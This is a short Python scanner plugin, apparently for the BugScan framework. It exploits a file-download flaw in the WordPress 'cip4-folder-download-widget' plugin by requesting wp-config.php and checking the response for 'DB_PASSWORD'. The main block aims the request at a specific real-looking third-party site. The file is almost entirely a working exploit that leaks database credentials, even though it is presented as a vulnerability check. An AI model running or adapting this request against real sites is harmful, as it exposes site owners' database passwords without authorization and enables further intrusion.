#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '半块西瓜皮'
# refer https://www.bugscan.net/#!/x/21137

def assign(service, arg):
    if service == "wordpress":
        return True, arg
def audit(args):
    payload = 'wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php'
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and 'DB_PASSWORD' in content:
        security_warning(verify_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.misssky.cn/')[1])